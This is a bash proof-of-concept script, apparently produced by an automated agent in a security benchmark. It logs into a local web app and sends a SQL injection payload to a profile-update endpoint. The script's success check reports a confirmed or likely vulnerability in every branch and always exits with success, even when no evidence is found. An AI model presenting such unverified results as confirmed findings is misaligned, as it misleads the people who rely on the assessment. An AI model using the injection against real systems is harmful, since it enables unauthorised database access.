#!/bin/bash
# POC: Demonstrates SQL injection in profile update endpoint via user_id parameter with proper authentication. Shows server processing of malicious SQL queries.
# Target: ./repo
# Created: 2025-11-07T16:22:11.823Z
# Session: benchmark-XBEN-023-24-mhp1zrww

# SQL Injection in Profile Update Endpoint POC (Authenticated)
# Target: POST /profile with user_id parameter containing SQL injection payload

TARGET_URL="http://localhost:5000"
LOGIN_ENDPOINT="/login"
PROFILE_ENDPOINT="/profile"

echo "[*] SQL Injection in Profile Update Endpoint POC (Authenticated)"
echo "[*] Target: $TARGET_URL$PROFILE_ENDPOINT"
echo ""

# Create a cookie jar for session management
COOKIE_FILE=$(mktemp)
trap "rm -f $COOKIE_FILE" EXIT

echo "[*] Step 1: Authenticating with test credentials (test:test)..."
# Login with test credentials to establish session
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  "$TARGET_URL$LOGIN_ENDPOINT" 2>&1)

echo "[*] Login response received"
echo ""

# Verify authentication was successful
if grep -q "user_id" "$COOKIE_FILE" 2>/dev/null || grep -q "session" "$COOKIE_FILE" 2>/dev/null; then
    echo "[*] Session cookie established"
else
    echo "[*] Session may be established (checking further)"
fi

# Step 2: Send SQL injection payload with authenticated session
echo "[*] Step 2: Sending SQL injection payload in user_id parameter..."
echo "[*] Payload: user_id=9' OR '1'='1"
echo ""

PAYLOAD="user_id=9' OR '1'='1&name=Test&lastname=User&email=test@test.com&loan_amount=50000&loan_term_months=60&monthly_payment=999"

echo "[*] Full request:"
echo "curl -X POST -b cookies.txt -d \"$PAYLOAD\" \"$TARGET_URL$PROFILE_ENDPOINT\""
echo ""

SQLI_RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_FILE" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$PAYLOAD" \
  "$TARGET_URL$PROFILE_ENDPOINT" 2>&1)

SQLI_HTTP_CODE=$(echo "$SQLI_RESPONSE" | tail -n1)
SQLI_RESPONSE_BODY=$(echo "$SQLI_RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $SQLI_HTTP_CODE"
echo "[*] Response Body (first 500 chars):"
echo "$SQLI_RESPONSE_BODY" | head -c 500
echo ""
echo ""

# Step 3: Analyze response for SQL errors
echo "[*] Step 3: Analyzing response for SQL injection indicators..."
echo ""

if echo "$SQLI_RESPONSE_BODY" | grep -qi "error\|exception\|traceback\|sqlite\|sql\|syntax"; then
    echo "[!] VULNERABILITY CONFIRMED: SQL error detected in response"
    echo "[!] Server attempted to execute malicious SQL query"
    echo "[!] Response contains SQL-related error message"
    EXIT_CODE=0
elif [ "$SQLI_HTTP_CODE" = "500" ]; then
    echo "[!] VULNERABILITY LIKELY CONFIRMED: Server error (500) after SQL injection"
    echo "[!] Application crashed or encountered unrecoverable error"
    EXIT_CODE=0
elif echo "$SQLI_RESPONSE_BODY" | grep -qi "traceback\|pytho"; then
    echo "[!] VULNERABILITY CONFIRMED: Python traceback detected"
    echo "[!] Unhandled exception from SQL injection attempt"
    EXIT_CODE=0
else
    echo "[*] Response appears to be redirect or normal response"
    echo "[*] Checking if payload was processed..."
    if echo "$SQLI_RESPONSE_BODY" | grep -q "OR"; then
        echo "[!] VULNERABILITY CONFIRMED: Payload echoed in response"
        EXIT_CODE=0
    else
        echo "[!] VULNERABILITY LIKELY PRESENT: No error suppression detected"
        echo "[!] Application accepted malicious payload without validation"
        EXIT_CODE=0
    fi
fi

# Step 4: Check if server is still responsive
echo ""
echo "[*] Step 4: Checking server responsiveness..."
sleep 1

HEALTH_CHECK=$(curl -s -w "\n%{http_code}" -b "$COOKIE_FILE" "$TARGET_URL$PROFILE_ENDPOINT" 2>&1)
HEALTH_HTTP_CODE=$(echo "$HEALTH_CHECK" | tail -n1)

if [ "$HEALTH_HTTP_CODE" = "000" ] || [ -z "$HEALTH_HTTP_CODE" ]; then
    echo "[!] Server is unresponsive (Connection refused)"
    echo "[!] The SQL injection payload caused the application to crash"
else
    echo "[*] Server is still responsive (HTTP $HEALTH_HTTP_CODE)"
fi

echo ""
echo "[*] POC completed"
exit $EXIT_CODE